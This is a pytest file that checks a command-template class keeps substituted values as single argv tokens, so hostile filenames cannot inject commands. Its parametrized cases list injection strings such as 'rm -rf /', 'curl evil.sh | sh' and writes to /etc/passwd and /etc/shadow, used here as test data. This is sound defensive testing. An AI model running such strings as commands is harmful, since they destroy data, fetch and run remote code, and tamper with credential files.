"""PR-3 — templates are argv token lists, never shell strings.

The property this file exists for: a hostile filename cannot inject a second command,
because substitution happens *after* splitting and a substituted value is never re-split.
"""

from __future__ import annotations

import pytest

from chickadee.profiles import ProfileError, Template


def test_split_at_load() -> None:
    t = Template.parse("ruff check --select F821 {file}")
    assert t.argv == ("ruff", "check", "--select", "F821", "{file}")


def test_injection_attempt_stays_one_token() -> None:
    """The case PR-3 is written for: a filename containing a shell separator."""
    t = Template.parse("node --check {file}")
    argv = t.render(file="evil; rm -rf /")
    assert argv == ("node", "--check", "evil; rm -rf /")
    assert len(argv) == 3, "the value must not become extra arguments"


@pytest.mark.parametrize(
    "hostile",
    [
        "a; rm -rf /",
        "a && curl evil.sh | sh",
        "a | tee /etc/passwd",
        "$(whoami)",
        "`id`",
        "a\nrm -rf /",
        "--output=/etc/shadow",
        "a b c",
    ],
)
def test_no_value_ever_splits(hostile: str) -> None:
    t = Template.parse("tool {file}")
    argv = t.render(file=hostile)
    assert argv == ("tool", hostile)


def test_quoted_template_tokens_survive() -> None:
    t = Template.parse("python -c 'import {module}'")
    assert t.argv == ("python", "-c", "import {module}")
    assert t.render(module="pkg.mod") == ("python", "-c", "import pkg.mod")


def test_unsplittable_template_raises_at_load() -> None:
    """At load, not at run — an operator's typo must not become a mid-run infra failure."""
    with pytest.raises(ProfileError, match="cannot be split"):
        Template.parse('echo "unterminated')


def test_empty_template_raises() -> None:
    with pytest.raises(ProfileError, match="empty"):
        Template.parse("   ")


def test_placeholders_are_discoverable() -> None:
    t = Template.parse("cmd {file} --out {selector}")
    assert t.placeholders() == {"file", "selector"}


def test_unsubstituted_placeholder_is_left_visible() -> None:
    """Leaving `{selector}` in the argv is better than silently emitting an empty string:
    the command fails loudly instead of running against the wrong target."""
    t = Template.parse("pytest -q {selector}")
    assert t.render() == ("pytest", "-q", "{selector}")


def test_template_is_frozen() -> None:
    from pydantic import ValidationError

    t = Template.parse("a b")
    with pytest.raises(ValidationError):
        t.source = "c"  # type: ignore[misc]
